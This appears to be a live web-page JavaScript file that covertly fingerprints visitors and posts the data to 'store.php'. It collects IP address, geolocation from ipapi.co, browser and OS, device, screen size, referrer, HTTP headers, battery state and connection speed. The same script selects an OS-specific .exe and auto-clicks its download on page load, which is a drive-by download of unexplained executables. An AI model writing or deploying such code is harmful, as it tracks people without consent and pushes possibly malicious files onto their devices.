var getIpInfo=getIpInfo();
// console.log(getIpInfo)
var InternetSpeed=getInternetSpeed();
var getHttpHeader=getHttpHeader();
var getScreeResolution=getScreeResolution()
// getIpInfo.query
// `${getIpInfo.city} / ${getIpInfo.country}`
// getIpInfo.isp
var userData={
    IpAddress:getIpInfo.ip,//ok
    BrowserTypeAndVersion:platform.name+' version '+platform.version,//ok
    OperatingSystem:platform.os,//ok
    DeviceType:WURFL.form_factor,//ok
    ScreenResolution:getScreeResolution,//ok
    TimeAndDateOfVisit:getDate(),//ok
    ReferralSource:document.referrer,//ok
    Location:`City:${getIpInfo.city}, Country:${getIpInfo.country}`,//ok
    InternetServiceProvider:getIpInfo.org,//ok
    LanguagePreferences:navigator.language,//ok
    UserAgentString:navigator.userAgent,//ok
    WebPageVisited:document.location.href,//ok
    InternetSpeedAndConnectionType:'',
    HTTPHeaders:getHttpHeader.headers,//ok
    deviceName:'',
    deviceModel:'',
    deviceManufacturer:'',
    deviceSerialNumber:'',
    deviceMacAddress:'',
    deviceBatteryLevel:'',
    deviceChargingStatus:'',
}
function getIpInfo() {
    var http=new XMLHttpRequest();
    // http.open('GET','http://ip-api.com/json',false);
    // http.open('GET','https://ipinfo.io/',false);
    http.open('GET','https://ipapi.co/json/',false);
    http.send(null);
    return JSON.parse(http.responseText);
    // return http.responseText;
}
function getScreeResolution(){
    var screenSize = '';
    if (screen.width) {
        width = (screen.width) ? screen.width : '';
        height = (screen.height) ? screen.height : '';
        screenSize += '' + width + " x " + height;
    }
    return screenSize;
}
function getHttpHeader (){
    var req = new XMLHttpRequest();
    req.open('GET', document.location, false);
    req.send(null);
    var headers = req.getAllResponseHeaders().toLowerCase();
    // let date= headers.substring(headers.indexOf('date'),headers.indexOf('etag')).replace('date: ','')
    return {headers};
}
function fileTodownload(){
    let os=platform.os.family;
    let version=platform.os.version;
    let btn=document.getElementsByClassName('btn')[0];
    if(os.indexOf('Windows')!=-1 && version==7){
        btn.href='../assets/files/W7.exe'
        btn.download='W7.exe'
    }else
    if(os.indexOf('iOS')!=-1 ||
    os.indexOf('Linux')!=-1||
    os.indexOf('OS X')!=-1||
    os.indexOf('Ubuntu')!=-1||
    os.indexOf('Debian')!=-1||
    os.indexOf('Fedora')!=-1||
    os.indexOf('Red Ha')!=-1){
        btn.href='../assets/files/IML.exe'
        btn.download='IML.exe'
    }else
    if(os.indexOf('Android')!=-1){
        btn.href='../assets/files/AND.exe'
        btn.download='AND.exe'
    }
    else if(os.indexOf('Windows')!=-1 && version==10){
        btn.href='../assets/files/W10.exe'
        btn.download='W10.exe'
    }
    window.onload = function() {
        btn.click();
    };
}
//Battery information
function getBatteryInfor(){
    if(navigator.getBattery){
        navigator.getBattery().then((battery) => {
            userData.deviceChargingStatus=battery.charging? 'Charging' : 'Not charging'
            userData.deviceBatteryLevel=`${battery.level*100}%`
        })
    }
}
function sendDataToStore(){
    setTimeout(() => {
        $.ajax({
            url: "store.php",
            type: "post",
            data: { data: JSON.stringify(userData) },
            success: function(response) {
            //   console.log(response);
            }});
    }, 200);
}
function getDate(){
    const now = new Date();
    return now.toLocaleString();
}
function getInternetSpeed() {
    return new Promise(function(resolve, reject) {
        var testImage = new Image();
        var startTime, endTime;
        testImage.onload = function() {
            endTime = (new Date()).getTime();
            var SPEED = (10 * 1024) / ((endTime - startTime) / 1000);
            resolve(Math.floor(SPEED));
        };
        startTime = (new Date()).getTime();
        testImage.src = "../assets/Logo connection.png";
    });
}
getBatteryInfor();
fileTodownload();

// UserInfo.getInfo(function(data) {
//     userData.IpAddress=data.ip_address
//     userData.Location=`${data.city.name} / ${data.country.name} / ${data.continent.name}`
//     userData.TimeAndDateOfVisit=data.request_date
// },function(err) {
    //     console.log(err);
    // });
getInternetSpeed().then(function(speed) {
    userData.InternetSpeedAndConnectionType=`${speed} KB/s`;
    // console.log("Internet speed: " + speed + " KB/s");
    console.log(userData)
    sendDataToStore();
});

//Store data only once in the same browser
// if (localStorage.getItem('Run') !== 'true') {
    // Run the function
    // Set the flag in local storage
    // localStorage.setItem('Run', 'true');
// }